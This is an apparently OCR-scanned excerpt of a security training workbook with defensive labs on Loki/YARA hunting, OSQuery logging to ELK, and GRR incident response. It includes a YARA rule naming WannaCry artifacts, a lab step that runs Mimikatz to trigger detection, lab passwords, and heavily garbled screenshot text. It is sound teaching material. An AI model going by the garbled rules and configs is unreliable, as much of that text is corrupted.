11. Analyzing misp.yar Now, let's open up the .yar file that we just moved. You can right-click the misp.yar file and select "Edit with Notepad++". Should Notepad++ prompt you for an update, please ignore it by clicking the "Cancel" button in the pop-up window.
In the first YARA rule, you'll notice that it's looking for a number of strings to detect the Wannacry ransomware:
o "taskdl.exe" o "taskse.exe" o "r.wnry"
0

252

© 2017 Erik Van Buggenhout & Stephen Sims

C!' C\lken\nock.lury\D<,l<top1Lol<i\sign.1tu,e-.,_\yoro\m,Sf>-YII - Not~··

v,.., File Ed<t S.11ch

En<od,ng l1ngu1ge S<mngs Tool> Macro Run Plug,ns Window 1

"

· ·

C . .. t'

..., ~ '.lilll .1

El-,-o
·
.& Check out. bt.tc·//0 or1 rctdSibtdACO,tA on hov ca write and odd a rnle. aa below end 1nde.x j-ou.r rule by t.te aMaple h.a,he:1. Add, share: .. rinse and repeat!

D X X

rule Wa:maDecryr:rt.or: Wanna.O.crz-pc.or
(
raeta: desc:1..pt:ion · · Det.cction tor c0a1011 at:rinoa cc "an.a·Decryptor·

~z:1.nqe:
$1.d.!. -
S1d2 · S:1d3 · S.1d-t · S1.d5 · S1d6 · $147 ·

·t.eakd.l.e.xe· "'1;1ekae.exe.· ·r .vn.ry· ·:ii.vn:y· ·t .·.m.ry·
· ll.wnry·
"'Uq/ a_·

"

eond.1t.1on:

,U

3 of <Ilea

1

28

meta:

29

de.scr1pc1on · ·sr,ec1t1c sawiple Mt.Ch tor Wa.rme.Cryp:cor·

S-0

>IDS · "!1~2eJ:iaS<l21bbcf1Sa61706Cl!abS19·

SllAl · · srtHSat...bcbf01SOd!a3ab2<:2e11UaH26161"

,,_

~2

,=s6 · " "'10lebtlx:9·b5bbea51Saf1d01bfSf1011661e101eo139c6eSbo.bdeOIOe1:u·

ll

mro · · toot-s tor ·c··kd.l' and 'taet.se: 1 ac lr:novn ottseca·

1

~

sc:u.no·:

,6

Sual<dl · ( 00 11 U 13 e, 61 6c I

- - - - - - ~ - - - - - - - - - Scube · ( 00 -1 0 13 6b 73 65 I

12. Having a look at Loki
So, let's have a look at Loki! We've already installed Loki on the Desktop of our user. Loki was developed by Florian Roth of BFK Consulting, it is the "little brother" of the commercial tool Thor.

Now that we've downloaded our iocs from MISP and placed them in the right directory, we can now run Loki. First, right-click the command prompt icon, rightclick "Command Prompt" and select "Run as Administrator". Next to the file system, Loki can also scan the entire machine memory, for which it requires administrative credentials. You can use the following credential set:
o Username: .\student-localadmin
o Password: sec599
Once the command prompt is opened, please navigate to the following directory:
C: \Users\nick.fury\Desktop\Loki

© 2017 Erik Van Buggenhout & Stephen Sims

253

13. Review Loki options Once inside the right directory, let's launch Loki to obtain an overview of available options:
C:\Users\nick.fury\Desktop\Loki\> Loki.exe -h
As we indicated before, Loki is capable of scanning the filesystem and memory of target hosts. This however also means that it can take quite a while to scan every single file on the filesystem for a large set of YARA rules.
In our example, we will run Loki using the "--nofilescan", which will skip Loki's file system scan and thus mainly focus its efforts on the machine memory.

14. Running Loki using -- nofilescan We will now launch Loki using the following command line:
C: \Users\nick.fury\Desktop\Loki> Loki.exe --nofilescan
You will notice that Loki is quite verbose! Loki will first load all available IOCs and YARA rules, after which it will start looking for them throughout the system memory. Don't worry about the warnings and the rather "fast" output, this is to be expected. At the end of the scan, we'll receive a brief summary that will indicate what was identified!
At the end of this scan, you should receive a message indicating that the system is clean. This is to be expected, as we are currently only scanning the memory ( not the file system) and we are not running any "suspicious" tools...

254

© 2017 Erik Van Buggenhout & Stephen Sims

15. Adding some suspicious items... Now, let's make our system look a bit more suspicious by doing the following:
o In a new command prompt, go to "C:\Users\nick.fury\Desktop \Mimikatz\x64" and run "Mimikatz.exe". Don't specify any arguments, just open the Mimikatz prompt.
o On the Desktop, please rename Putty.exe to "taskdl.exe" and double click it. Here as well, just leave the window open, but don't try actually using Putty.
Please refer to the screenshot for the expected result.

-,-__ ~ Teffll'IIII ~ 1W
;; Wrdow
T,_,
Seloalon ectu. c.nnoct,on 0.0,
T-Proxy
Flogn ~ SSH
s..,,;

~Ol)la,olor_.PuTTY-

Sc,edylhe_._'°""'"tooomec,io

Hootl'-.,,-fl'-.)
L

Pol
It~

o r - os..w Comocl,ont,i,e·
0Row

" Aogl, @SSH

- 7 load

o...- .... Q #,(oyl 0 Ne-m

®~"'-""'

16. Run Loki again Now, let's go back to our administrative command prompt (or, if you closed it, open

© 2017 Erik Van Buggenhout & Stephen Sims

255

it again using administrative credentials) and run Loki again using the following syntax:
C: \Users\nick.fury\Desktop\Loki> Loki.exe --nofilescan
You will again see some rather verbose output, after which you should now receive 2 warnings at the very end of the scan:
o One indicating a match on Mimikatz (due to the mimikatz.exe filename pattern)
o One indicating a match on the Wannacry ransomware (due to the taskdl.exe pattern)
This illustrates an interesting trade-off: a full Loki scan (without the --nofilescan) will take a lot more time, but will also be able to detect malicious artefacts that are stored on the hard drive without being executed.
It's a good idea to automatically perform this type of hunting in your environment (e.g. by downloading new intel from MISP on a weekly basis and running a weekly Loki scan using the new intel)... As we've seen during multiple exercises already, GPO's can come in handy for this type of automation!
i i A.dmm~tor. Command Prompt

256

© 2017 Erik Van Buggenhout & Stephen Sims

SEC599-5.4: Exercise - Hunting your environment using OSQuery & ELK
Objective
High-level exercise steps:
· Configure OSQuery & test it on our local Windows workstation · Create a schedule to run OSQuery periodically · Configure filebeat to forward OSQuery output to ELK · Optional: Create visualizations in Kibana
Scenario Virtual Machines
1. SEC599-C01 - DomainController 2. SEC599-C01 - Firewall 3. SEC599-C01 - Windows 4. SEC599-C01 - Ubuntu0l 5. SEC599-C01 - Ubuntu03
Exercise 1 : SEC599-5.4
The objective of the lab is to implement a light-weight collection tool that will collect system information from the different endpoints in our environment. We will use this information to baseline the systems and detect anomalies!
High-level exercise steps:
· Configure OSQuery & test it on our local Windows workstation · Create a schedule to run OSQuery periodically · Configure filebeat to forward OSQuery output to ELK · Optional: Create visualizations in Kibana
1. Authenticate to Windows workstation We will start this lab by authenticating to our Windows workstation using our usual credentials: o Username: nick.fury o Password: Awesomesauce123
2. OSQuery - Introduction &amp; Tables Before we get started, let's have a look at the type of data OSQuery can collect! We've created an offline copy of the online OSQuery "tables" page in C:\Users \nick.fury\Desktop\OsQuery.

© 2017 Erik Van Buggenhout & Stephen Sims

257

You can browse this directory in your Windows explorer and open the osqueryTables.html file. Take a few minutes to browse through this web page, as you'll need this background information for the remainder of our lab.
You will notice interesting categories such as: o "processes" to list running processes o "users" to list available users on the system o "autoexec" to list scripts, executables,... that start upon boot (Windows only); o "windows_events" to hunt for specific Windows event IDs (Windows only); o "yara" to provide integration & automated hunting with YARA rules; o "drivers" to list all available drivers (Windows only);
0

C It !>e<ure http, osquery.,o

8

D X

* :

~~ OSquery

O IJ 11(11:ie Docs IA,j 1.om111.in1lv l)own!P.Jch

autoexec

Aggrega:e o! e~ecu!allles mar"'" automatJCafiV execute on the target macnIne TllIs IS an amaigamaoon or o:ner labtes like services. scneduled tasl<S slattup_1Iems and rrore

De

path

TEXT_TYPf Path to Ille execu:able

Tf~T_TVP· Name or the l)(ograrr>

mer_:YPf source table or the au1oexec rem

drivers Oellllls fa, m-use Windows devtce drivers Thrs ooes no1 dlsplav lnsta'led bu1 unused dnvers

Tables
· tfon
· Mlc1osof1 W,ndows
·ppcorroat_sti·m:

d,vJ.c~_id devtcc_ n.-.c t.age dMcdpt.ion !ler-dce SeNice_kcy

HJCT_T"IPE
'Ta:T T'VJ)f
Tfxt_rwr T[d_1YP£ TfXT_TYPt
l[XT_T\'N

Device 10 Oevce name Patil to driver image n1e 011\'er <leserlpt10n Orrverservrce name. 11 one eX1Sts On,er service reglSlrv key

3. OSQuery - Taking it for a spin!
So what is this OSQuery you speak of? Let's start an elevated Windows command prompt by right-clicking the command prompt icon, right-clicking "Command Prompt" and selecting "Run as administrator". You can provide the following credentials:
o Username: .\student-localadmin
o Password: sec599

Upon opening the command prompt, run the following commands:

C: \ Windows\system32> osqueryi

258

© 2017 Erik Van Buggenhout & Stephen Sims

osquery> select * from processes;
This very basic SQL-like syntax will return all running processes on our Windows machine. Feel free to browse through the output.
In a forensic investigation, a process that is running in memory while not having its executable stored on the disk could be considered suspicious. You can very easily obtain a list of these processes using the following command:
osquery> select* from processes where on_disk=0;

4. OSQuery - Processes with listening ports Some other example queries to identify suspicious behavior in our environment include:
SELECT DISTINCT process.name, listening.port, listening.address, process.pid
FROM processes AS process JOIN listening_ports AS listening ON process.pid =
listening.pid;
This query will return all processes that are listening on a specific port. This could be useful in some types of malware that directly provide a shell through a listening network port.

© 2017 Erik Van Buggenhout & Stephen Sims

259

s. OSQuery - Challenge: Outbound connections
Next up, we can try running OSQuery to detect suspicious connections from our host to other systems. We thus want to have a view with all processes that set up network connectivity to remote hosts. Make sure any local connections are not returned!
Hint: you will need both the "process_open_sockets" & "processes" tables. Note that the "Knowledge" and "Screenshot" buttons in LOOS will reveal a possible answer!
Upon finishing the challenge, please press CTRL+D to exit OSQueryi.
A possible solution is:
select s.pid, p.name, local_address, remote_address, local_port, remote_port from process_open_sockets s join processes p on s.pid = p.pid where remote_address not in ('127.0.0.1','0','0.0.0.0','::');
Although this query looks intimidating, it's actually not that hard to understand what it's doing:
o It's selecting certain fields (pie, name, local_address, remote_address, local_port, remote_port) from two tables (process_open_sockets and processes).
o It's using a SQL "JOIN" syntax to combine data from these two tables;
o It's filtering out connections towards remote address '127.0.0.1', 'O',
'0.0.0.0', '::' (as these are local connections);
Try running this with & without Chrome running on your Windows workstation and assess the difference!

260

© 2017 Erik Van Buggenhout & Stephen Sims

6. OSQuery - Reviewing the osquery.example.conf file So, we've ran a few one-off OSQuery commands that provide a glimpse of its capabilities. In an enterprise environment, we probably want to run a series of queries periodically in our environment. We can again use a stack such as ELK to collect, index & visualize the log information...
So, let's get started. First of all, we need to create a solid osquery.conf file in C:\Programdata\osquery. In a Windows explorer window, please open the C:\Programdata\osquery directory. Right-click the "osquery.example.conf" file and select "Edit with Notepad++".
Take your time to review this configuration file, we will use it as a basis to tailor an osquery.conf file!
At the bottom of the file, you might notice that a number of "packs" are commented out. These "packs" are predefined queries that could be useful for specific use cases. Unfortunately, some of the more interesting ones (e.g. the "incident response" one are tailored to OSX and not Windows)...

© 2017 Erik Van Buggenhout & Stephen Sims

261

~ C:\ Prog,amOm ,osquery\osquc,y.OA1mple.conf - Notq>1d··

Fil· Edit Sutch v,,,_, Encoding lang\l<lgt Sttting, Tools Micro

· -~

:> · lw ''C

Run Plug,ni Window 7
!,' ~ =Ill ~)~

· X
X

II Contiqure che dae,oon below:

"'

"opt1ona·: (

4

II Select the oaquery conflO pluo1r..

$

·contig_plugin·: ·t1le3ystea·,

// Selecc the oaque~y l0901no pluou:.

e

· 1ogQerylug1n·: -r11~syscea·,

1

// The loo d~rcccory score· into, warnino, a.nd errora.

1.

// If the dae&en uses the ·t1lesyscem' 1000100 retriever then the loo_d.l.r

2

// v111 a1so contain che query resulca.

// ·l0<1oer_ path·: · t vu:/109/osquery·,

11

// Sec 1 d1.sA.ble lcQq1no' ~o crue co prevenc vr1c1no any 1n!o, wo rn1n~, error

16

/I 10(18. It a l09qino plugln 18 selected it will atlll write query results.

// "d1s&ble_l0991no·: "false·,

e

l

// Splay the scheduled interval tor queries.

2

/I nu.sis very helpful to prevent systea pertoraance u,;,&ct when schedul1no

41

// laroe nUllbere of quer1ca that run a slllllller or s11111lar intervals.

22

// "schedule_splay_pcrccnt·: ·10·,

2

2f

// A t 1lcsystca path tor disk-based backing scoraoe u sed t or eventa and

// query :esulca CUfte=encials. See al~o · u ~~-~n_&e1110ry_da~a.base 1 ·

// "daeal)ase_paeh": · tvar/oaquery/osqucry.db",

// Co:cma-del.l.Jlll.ted list of table ~&&es to be disabled.

19

II Thi., allova osqu,ery t o t><, launcncd withouc ccrcu.n cal)lcs.

// ·d15a.ble_cabl~~ · : ·too_ba r,~1.11e·,

Norm1Itat lilt

length : 2,843 lines: 74

ln: I Col: 1 Scl:OJO

W1ndowi (Cit LF) UTF-8

INS

7. OSQuery - Create a osquery.conf file
We will now create an osquery.conf file based on the existing example file. In the C:\ProgramData\osquery folder, please create a copy of the osquery.example.conf and rename it osquery.conf.

-;- osquery

D X

Hom·

Vltw

8

i- ·

> This PC > local Disk (C:) > Prog11mData osquery ,

Searc.h osqucry

p

..J, Downloads ti " Ill mt

Ditt mod,f,td

T)PC

Sat

Documents ti

certs

4/24 201~ 4 S8 PM Fil~ iolckr

... P1cturei

log

9n112onr.2SAM f,lefolder

Honeytoktns

osquery.db

9 17/20179;2S AM F,lefoldt,

.....

Lola J Music
PrMlege Escalati 41 OncDrr,,c - , This PC

0'.que,yd
packs
m·nage-osqueryd.ps1
Iosquery\conf
osquc,y,Cltlmplt.conf
osqucryd.p,df,lt (i'" 0'.que,y,.e,cc

9 17 2017 i.:i' AM Bi 17 zo1-10:S4 PM '112S/201,6:36PM 6 23 20177;05 PM 6"!3/201- -;OS PM 9 17/201 H:ZS AM 8122/2017 7.12 PM

File f.ilder
Fdtfolder W,ndOM Powe,S_
co·ir ri1,
CONFFde PDFUF,k App ,cat,on

S KB
HB
31:S IKB 8922 KB

..,

10 lttm~ 1lttm 5'1ttltd 2.771(8

8. OSQuery - Adapt config file

Now, let's right-click the osquery.conf file and select "Edit with Notepad++". We will adapt the schedule accordingly:

o Update the interval of the "system_info" entry to 60 (to have it run once per minute);

262

© 2017 Erik Van Buggenhout & Stephen Sims

o Under the "system_info", add the following entries: "Processlist" and "Networkconnectivity", each with their own query definition (as you've seen in the previous lab steps) and an interval of 50 seconds. The query definitions we will use are:

· SELECT* FROM processes;

· SELECT s.pid, p.name, local_address, remote_address, local_port, remote_port FROM process_open_sockets s join processes p on s.pid = p.pid where remote_address not in ('127.0.0.1','0','0.0.0.0','::');
When creating the new entries, ensure you place all the"}" and"," symbols in the right locations, otherwhise the configuration file will fail to parse. Furthermore, ensure the queries are delimited by double quotes ("). Upon changing the file, be sure to save it using the "save" icon in Notepad++.

Note that in a real enterprise environment, fetching this type of information once per minute will most likely be overkill. You could opt to only run this once per hour or once per day even.

Please refer to the screenshot for the expected configuration changes, which have been highlighted.

~ · C:\P109r1mData\osque,y\osquory.conf - Notepad+·

"° = File Edrt Search View Encoding Language ~,ng, Tools Macro Run Plog,ns Window ?

B 0 j

i O O~

I:,__) ltJ :,;t ir: ft "s t t - "'"I I ~.

lJ: ~ l) ...J *

i:i1 ~ liil otQUOfY // This allows osquery to be laUJ>chcd wir.hour. ccrcain r.a.bles .

// "disable_,:.ab1es · : ~too_bar,ei.me·,
:,

32

"u-c.c· : ·true·

5

I,

I~ ·

[iJ it) IC

// Octinc a schedule ct queries :

".schedule·: { // This 1s a silr.ple exa.rr,ple query thae outpucs basic system 1ntorm.aeion.

"sy.st.em 1.n.to": {

// The exacr. query to run . ·que ry· : "SELECT host nair.e, Ci)U_brand, physical_mcmory FROM s ystcm_info: ·,

4

/ / rte 1:1t.erva.l in s econds eo :-un -ch1.s que ry, no-c. an e.xace 1nee.rv&l .

4.2

· 1.n1:.crval" : 60

'13

I,

44

·Proce sslia~·: { L . . - - - -

45

// The e xacr. query to run . ' - - - ~ -

4E,

· qu.e :cy·: "SEL.!:CT · froa p:rocesaf!s; ·, - - - - - - - - - - ~ ~

i

II The inter val 1.n seeond.s to run ctus que~y, no~ an exac~ inte.rval.

4e

·1.nterva1·: so

49

1,

s

·Nc c.wor kconr.ect1v1r.y·: I

5.

/ / Tbe. e:,cace quar y i:.o ~un. ' - ~ ~

,S2

· que ~y· : · oclcc ~ s .pid, p . n.a&e, local_addreas , r!!mOee _ad.dre ~a, loca l_por-t., // 'Ihe 1r.terval in aeconds to run t!Us query, not an exact. 1nter va1.

4.

· 1.n't..erval 111 : 50

I, // De,coraeo:~ a re noraa..l quer1e5 ~bee append d.aea eo every querJ.

Normal text file

length : 3,439 fines : 86

Ln:55 Ccl:6 Sd:598113

Windows (CR U:) UTF-8

D X
X
INS

9. OSQuery - Running daemon &amp; reviewing logs

In order to start using the OSQuery configuration file, we will now launch the

© 2017 Erik Van Buggenhout & Stephen Sims

263

OSQuery daemon. In an elevated command prompt, please browse the "C:\Programdata\OSQuery\osqueryd\" folder and run the following command:
C:\ProgramData\osquery\osqueryd> osqueryd --allow_unsafe
If all goes well, the command will not return any feedback. This is expected behavior, please do NOT close this terminal window. We are adding the "allow_unsafe" option to the command, as in our lab environment, the default setup will otherwise complain about the permissions set on the osquery folder.
Upon minimizing the command line, you can open the following folder in the Windows explorer: "C:\ProgramData\osquery\log". When opening the "osqueryd.results.log" file (e.g. using Notepad++), you will notice that logs are being generated and logged in the .log file (in a JSON format).

10. Review Logstash configuration file Now, let's centralize the logs on our ELK stack. Inside the "Desktop\OSQuery" directory, you will notice 2 files are present:
o osquery-filebeat.yml
o osquery-logstash.conf
The osquery-filebeat.yml is used to configure Filebeat to forward logs to the ELK stack, while the osquery-logstash.conf file is used to configure Logstash to correctly parse the files.
First, let's have a look at the osquery-logstash.conf file. You can open this using our favorite editor Notepad++. You will see that it is instructing Logstash to start listening on port 6666.

264

© 2017 Erik Van Buggenhout & Stephen Sims

Hom·
- -t

Share Voow · This PC Desktop > OsQue,y

· X
0
p

· Deslctop
,I, Downloads ,;
Oocumfl!tS ,t ~ Pictures

osque,y-fil·be at.yml o s q u e , y- l o g s t u h.c o n f

Datemodifi~

9 I7/l0177;43AM VML fole

HB

9 17/2011 ~-SOAM CONF F,Jc

I KB

Honq,tolcfl!s

Loki

) Mus,c

Pl'lllilege Escalab r-
& OneOnve

._.. This PC
... .. .
2 Items

11. Open WinSCP and copy Logstash configuration file First, we will configure Logstash to correctly receive & parse OSQuery-generated logs. We can do this by opening WinSCP.exe (on the Desktop) and providing the following information:
o Hostname: 192.168.30.16
o Username: sec599
o Password: sec599
In the WinSCP screen, will open the "Desktop\OSQuery" folder in the left-hand window (local) and the "/tmp" folder in the right-hand window (remote). We will now drag & drop the "osquery-logstash.conf " file to the remote "/tmp" folder.

· Imp · sed990192.16&.:10.16 · W..SCP

Loo i M,,t, f~«s Commonm S--n Qpbon< !!<mot· tJt!p

· 83 ·· ~hronl,c r/1 liE] 0 (ii Queue ·

T,m>lc, Set1,n91 Otftuh

l;I s,c59')0192.168.30.16 Q' - -

· Otslctop

Iii · ·

. ~.
. ..... til · ·
)(

D X
1':l~~ 9c r,n,1 r,i. e1 t!li ~ YJ

Name
.. -

Sin Type
Pa,tf1t directo,y I l8 YMl fol< 1 IC8 CONH olt

Chonged
9/17/2017 7'5Ck12 AM 9 17/2017 7-4.31 AM 9/1712017 7,50,39AM

systtffld-p,..>tH793.. ,y,u md .,,.,,..o-d79.3.. ] osque,y-~ h.cor,I

s,.. Ch1n9ed
' n112011 lo1'·17 PM 9117/ 2017..ll.39 AM 9·17/2017 ..13,11 AM 9°17/2017 9-12·38 AM 9/17/2017912.li AM 9/17/20179'1B8 AM 9117/l0179'1LJ8AM 9.117/20179:lcli AM IICll 9/17/2017 H0,39 AM

R>9h«
t'W'JCl·Q l tw0·&1·a M:IJ·Q ·Jt l'W'I,····· · f'WX,· ·· u· MX······
'-'·- -
M')l··-M-rl/llH-

Own«
root
-··Nsoa.
root
,oo,
,_
,to_o<
«<599

12. Restart Logstash service

Next up, let's move the Logstash configuration file to the right location and restart Logstash. We will accomplish this by first setting up a Putty session to

© 2017 Erik Van Buggenhout & Stephen Sims

265

192.168.30.16. The credentials you can use are the following:
o Username: sec599
o Password: sec599
Once authenticated, we will switch user to root (using password "sec599"), move the logstash configuration file to the right directory and restart the logstash service using the following commands:
sec599@ubuntu03:~$ su root root@ubuntu03: / home/sec599# mv /tmp/osquery-logstash.conf / etc/logstash /conf.d/ root@ubuntu03:/home/sec599# service logstash restart

13. Adapt Filebeat configuration file Now that we are generating OSQuery information locally and have Logstash properly configured to receive logs, we will configure Filebeat to forward logs. On the Desktop, please open the "OSQuery" folder right-click on the "osqueryfilebeat.yml" file and select "Edit with Notepad++".
The configuration file is nearly completed, but a few options need to be adapted:
o Hosts: ["192.168.30.16:6666"] (change the port to 6666)
o Paths: C: \ Programdata\osquery\log\osqueryd.resuIts. log
Once done, save the file and close Notepad++. Furthermore, we'll rename the file to "filebeat.yml" and copy it to "C:\Program Files\Filebeat", thereby overwriting the existing "filebeat.yml" file.

266

© 2017 Erik Van Buggenhout & Stephen Sims

,-

Q' C:\Program Filts\ Fild>tat\lild>ut.yml · Notepad··

D X

v,.,,, File Edit Search

Encoding language Settings Tools Macro Run Plug,ns Window ?

X

I>. ,. 0 ..J A \.a O O gi .k ~. ti .> C II

t cf. "':j '::. ,. :J: ::J [;j,J O i..J ~ I Iii [i] :}) :ltl Ir,

I H iw-)!ff £1

~ilebeat.prospeotors:

;.

t : -P~C t~~~ 0.5~~r~ .095

.,]- tnput_,:ype: loo

El paths:

'

- C: \ProoramDaea\osquery\loo\osqueryd. resules.loq dOC'!IIW:nt_type : j son

e I~ Cields:

9

type: osquery_json

10

codec: Json

· Per"e each ~1::e a:, JSO!I

12

JSon.nessage_~ey ; lOQ

1:!
- 4 · Ot.;.p~e ~o :oo:,~asn

15 l outpot. logsta.sh:

16

hosts: ["192 . 168.30.16:6666" ]

1~

ta · S~tpper deto.ls

1,o9

na.e: ·windows02@sl/11ceechlab" . cam·
tags: t·w1ndows02· I

2~

t F~·ebeac lCQUU'lQ

23

lOQQi119.level : debug

YAML Ain't Maritup Langu, ltngth: 462 lints: 23

Ln:6 Col:54 Sel:010

Windows (CR LF) UTF-8

INS

14. Restart filebeat service Please open a new administrative command prompt (right-click command prompt icon, right-click "Command Prompt", "Run as administrator) with the following credentials: o Username: .\student-localadmin o Password: sec599 In the command prompt window, run the following command:
C:\Windows\system32> services.msc
This will open the services GUI, where we can now browse for the "Filebeat" service, right-click and select "Restart".

© 2017 Erik Van Buggenhout & Stephen Sims

267

Seiv1cl!S

File Action V1e!1< Help
~ rml· · n··

Seivices (local)

Servicl!S (local)

fllebeat

S,.QJl theseMce Resta" the seMce

\ Extended Standard Slop and Start service filebeat on Local Computer

D X

Name

Oescnpbon Status Startup Type Log"

r, Fax

Enables you...

Manual

Nrl

~ File History Service

Q.ifitj§j

w, Function Dis

4,Function Dis

Stop

k. m Protects us~..

Manual (Trig... Loe

,M,ie11,l·M·ffi¥ii

Manual

Loe

th...

Manual

Loe

Q,Geolocation

P~use

Manual (Tng... Loe

-S ·Google Updl Resume

Automatic (D... Loe

,Q.Google Upd1
-s.>,Group Poli<)' .S, HomeGroup
,!;,,.HomeGroup

Restart All Tasks

,,~ ) i,,I...
..

Manual

Loe

Automatic (T... Loe

Manual

Loe

Manual (Tng... Loe

,C,>, Human Inter S, HV Host Sen

~n...

Manual (Tng... Loe

In ...

Manual (Trig... Loe

-,f,Hyper·V Oat,

Help

I... Running Manual (Tng... Loe

-Q,Hyper·V G U L - - - - - - -- 'n ...

Manual (Tng... Loe

,$;;,Hyper·V Guest Shutdown S... PrOVldl!S a ... Running Manual (Trig... Loe

~ 1Hypea-V Heartbeat SeMce Monitors th... Running Manual (Tng... Loe

4 Hyper-V PowerShell Direct... Provides a ...

Manual (Tng... lee

·!:.· Hyper-\1 Remote Dl!Slctop Vi... Provides a p... Running Manual (Trig... Loe

~: Hyper-V Time Synehron1zat... Synchron12e... Running Manual (Trig... Loe

~ Hyper-V Volume Shadow C... Coordinates... Running Manual (Tng... Loe"

<

>

15. Open Kibana &amp; create index pattern
Once filebeat has been restarted, it should have started forwarding logs to ELK. We will now open the Kibana interface to review incoming data! You can open Google Chrome and select the "Kibana" bookmark. You might need to accept an SSL certificate warning (as its a self-signed certificate) and can use the following credentials:
o Username: admin
o Password: sec599
In the default Kibana "index creation" screen, please make sure "@timestamp" is selected as the "Time Filter field name", scroll down to the bottom of the page and click "Create".

268

© 2017 Erik Van Buggenhout & Stephen Sims

e

0 X

X

f-

C A "lot uc,,,~ 1>!'1!"''11192.168.30J6 1pplbbffll·/MAnagffl1enl/'<lbana inoe>>.o·O

·< 'IS' m,.,,,.r,_~

£3 Cockoos.r.dbo, ~ s.mple.·E"""obY

..i..... ';) N-.. Cl ~&.d9<· · ~ISP

m

' *

( kibana

rN:o_:.,,,,.,..._.
_...vou-.
se--ea or a~r.e o,,e
tocon~~ue:,

Configure an index pattern
tn.,, der to use K>bdna you 11'\r.il conf,gurt ~t east one nd.i· p.ittem. Index p,mems are~ to 1dent1ty the EIJstlcsearch 1ndeA lo run seJ<ch and anoly:,cs aga,nst. They are also used to conr6ure r,t-/ds.

Index name or piltUm

Time Filter fleld name O
··mesuimp
Expdnd Index Pllllt'fn when St'arch,ng (OEPRECATED)
··~ :.",iiop.!A)t'l ~eees se·te'--H~"'~-:vy!.'ff'.it btit'd ~ p.ttt~ Cf\.4t COt"!tall"l1 ·wildc6-'dldlaoAO~O'j be t<p,,~;oq»ay~ ~ n<kflt:"·-:«>""t.tna.~wt:h-r:d'-e<...,.·tf'Cfy~~wre-rv~ SHf<,. "'11ga nst tl'!c .,.,.Cfexp«:t-n lo111r1:,t,- ·w111a..ia:fy c;~ry E"ts::,ae.,.c:h tor d't-.c s~ckma.tch,,..I ,rcces (,e, I "'BJ'·-~1'1·1015. ,..,. JI )the: '.ai W1t1'.n the Cut'l'~t 11m11 r,ree
WU,, rec~: Ot·!'lfff ~o Elewaeerd\.~J Df>!.-O!" huld r,g ~bt: ~urisal')' ·l"'d iMI hJ,,:..ybe ,~.-ed 1r f..zt:ure ~~ ofI< Nf"·
~ event tJm~ to create Index name<, (OEPRECATEDJ

16. Discover data Once the index pattern has been created, please click the "Discover" button in the top-left hand Kibana menu. This will reveal the raw events that are being generated and are being loaded in Kibana.
Amongst many others, you might notice a "json.action" field exists with typical values "added" or "removed". What's that all about?
As you may remember, we have configured the OSQuery queries to run every minute. OSQuery is smart enough to generate differential logs. For example, the first time the "Processlist" query runs, it will generate a lot of events, as it has information on all running processes. Any subsequent runs of the query will however only generate differential logs (processes that were removed or added).

© 2017 Erik Van Buggenhout & Stephen Sims

269

[I Kibano

)(

f(J PIS,,,,. fvewa,I ',( Cudroo 5-dbo> D s.mpi.. · e-.,,-., [1 l(ibono
S32 hots

8

· X

CTf

< New sa,e open Shdre

> 0 Las1151T11ntlt~

Adda lthr · Selected Fields
I Js.on..actJOf'I
1 _1d ' ndc:x · _K,O<t

0

Septembe< · :'th 201 7 ·3'5' :3,.978-Septeirb<,· 17t~ 20'7, '4:06:37.978 - AUIO

0

53

13.53

l I

59

101re

Ot n, · 1 1p p,9r 30 .ac:ond·

·-.,., I):,

·
"

Tlf'ne

source

· Septe't'be.- lith ZOl.7, 14:06:H). .418 Pti.tlnt-,; Septfflb!!f' 17th 201;", 14:06:16.,aa
ofht:t: 6S'7,S'"'S lnpul_type: log be.rt.bo!itn-.e-: Wl ..,~S02 be.at.--.e: 111,nct°"'sObf.synct~chh.bs. C()l'I'" brill,Vrr-sion: S.6.0 @v~riJon: .l ho~t:: WrI\lX>'ASO? jsort.c;·lmd.lrTiat: Sun Seo 17 14:06:10 1017 l,TC

· Septc-rbcf" l7tn ?017, 14:06:lEi, 4 18 ~i9e:stMO~ St:Dtenbe:r 17th ?017 14:06:16.41$

17. Optional - Get creative and visualize data
If you have some time left, feel free to get creative and build some Kibana visualizations on top of the data that we're feeding into the ELK cluster.

As always, your instructor or TA would be happy to support if required.

270

© 2017 Erik Van Buggenhout & Stephen Sims

SEC599-5.5: Exercise - Incident response using GRR
Objective
The following are high-level exercise steps we'll need to complete: · Deploying GRR on one of our Windows-based endpoints · Browsing t he remote filesystem from the GRR management console · Acquiring a remote memory dump from the GRR management console · Launching a hunt looking for suspicious files using GRR
Scenario
Virtual Machines
1. SECS99-C01 - DomainController 2. SEC599-C01 - Windows 3. SECS99-C01 - Ubunt u03 4. SECS99-C01 - Firewall
SEC599-5.S
During this lab, we will introduce GRR as a remote forensics tools. We will install the GRR agent on one of our Windows workstations, after which we will use GRR to browse the remote filesystem, acquire a remote memory dump & launch a hunt looking for suspicious files!
The following are high-level exercise steps we'll need to complete: · Deploying GRR on one of our Windows-based endpoints · Browsing the remote filesystem from the GRR management console · Acquiring a remote memory dump from the GRR management console · Launching a hunt looking for suspicious files using GRR

1. Authenticate to Windows workstation As always, we'll authenticate to our Windows workstation using the following credentiaIs: o Username: nick.fury o Password: Awesomesauce123
2. Access the GRR administrative console Next up, we will have a look at GRR's admin console, which we've added as a
bookmark in Google Chrome. It is running on host 192.168.30. 16 on port 8000. The
credentials you can use to authenticate to the system are: o Username: admin o Password: sec599

© 2017 Erik Van Buggenhout & Stephen Sims

271

The GRR admin console can be a bit "tricky" to work with, so take your time to get the hang of it. As a first test, click in the search box (top of the screen) and press ENTER (without entering any values). This will return Oresults, as there are currently no clients sending data to GRR.

0

0 X

~

C <D192.168.301&11000· "'

D CJ fol PIS,,,,. r .,.. I( ''"'loo S..-0-

S.,,,pies . (;, 'Mb><

j,bi,.. :.) N,,._, [) ~~ · MIS·

~ .3RR

2017--09-P 16 43 )1 llTC

CTf GRUd""n CO"JO ·
0. 0

MA>M:l:Mrn CionJobvi.we. tblll.~nage, Stv.,wSlatlsbO Stall Global Flow$
Adnnced-
, ~ llQII
M~Bmrlas
SAellri!tailalgMt M1aiJ4f

Onluw SubJtct Hos1 OS VersK>n MAC Usem1m11

Client f Hit SMn ver·1on

I

' *

API Help Repon a prabl<om
3 . Download &amp; install GRR executable So, let's install GRR on our very own Windows workstation! You can achieve this by browsing the following menu in GRR:
"Manage Binaries"-> "executables"-> "windows"-> "installers"
Select the "GRR_3.1.0.2_amd64.exe" file by clicking it and then click the Download (Arrow down) button. Once the file is downloaded, please just launch it (e.g. by double-clicking it). After requesting administrative credentials, the executable will silently install GRR on our system. You can use the following credentials:
